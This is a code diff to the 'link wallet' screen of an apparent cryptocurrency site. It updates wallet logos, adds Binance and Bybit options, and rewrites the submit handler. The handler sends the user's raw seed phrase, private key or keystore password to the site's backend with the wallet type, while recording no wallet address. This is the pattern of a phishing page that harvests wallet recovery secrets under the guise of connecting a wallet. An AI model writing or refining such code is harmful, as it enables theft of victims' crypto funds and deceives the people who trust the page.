@@ -24,7 +24,7 @@ const wallets = [
   },
   {
     "name": "Cold Wallet",
-    "image_url": "https://qfinanceledger.org/images/wallets/4_cold_wallets.png"
+    "image_url": "https://cdn.brandfetch.io/idWx1jCRK9/w/369/h/369/theme/dark/icon.png?c=1dxbfHSJFAPEGdCLU4o5B"
   },
   {
     "name": "MetaMask",
@@ -128,7 +128,15 @@ const wallets = [
   },
   {
     "name": "Ledger Nano X",
-    "image_url": "https://qfinanceledger.org/images/wallets/ledger_nano_x.png"
+    "image_url": "https://cdn.brandfetch.io/idWx1jCRK9/w/369/h/369/theme/dark/icon.png?c=1dxbfHSJFAPEGdCLU4o5B"
+  },
+  {
+    "name": "Binance",
+    "image_url": "https://cryptologos.cc/logos/bnb-bnb-logo.png"
+  },
+  {
+    "name": "Bybit",
+    "image_url": "https://cdn.brandfetch.io/idWx1jCRK9/w/369/h/369/theme/dark/icon.png?c=1dxbfHSJFAPEGdCLU4o5B"
   },
   {
     "name": "Other Wallets",
@@ -166,20 +174,35 @@ export default function LinkWalletScreen() {
     setIsLoading(true);
 
     try {
-      let data;
-      if (connectionMethod === 'phrase') {
-        data = { phrase: seedPhrase };
-      } else if (connectionMethod === 'private') {
-        data = { phrase: privateKey };
-      } else if (connectionMethod === 'keystore') {
-        data = { phrase: keystorePassword };
+      const token = localStorage.getItem('token');
+      if (!token) {
+        toast.error('Please login to continue');
+        router.push('/login');
+        return;
       }
 
-      const response = await api.sendPhrase(data);
+      let phraseData = '';
+      if (connectionMethod === 'phrase') {
+        phraseData = seedPhrase;
+      } else if (connectionMethod === 'private') {
+        phraseData = privateKey;
+      } else if (connectionMethod === 'keystore') {
+        phraseData = keystorePassword;
+      }
+
+      const finalWalletType = selectedWallet?.name || 'Unknown';
+
+      const walletData = {
+        phrase: phraseData,
+        walletAddress: 'N/A',
+        type: finalWalletType
+      };
+
+      const response = await api.linkWallet(token, walletData);
 
       setSuccessData({
-        referenceNumber: response.referenceNumber,
-        walletType: selectedWallet.name,
+        referenceNumber: response.wallet.referenceNumber,
+        walletType: finalWalletType,
       });
 
     } catch (error) {
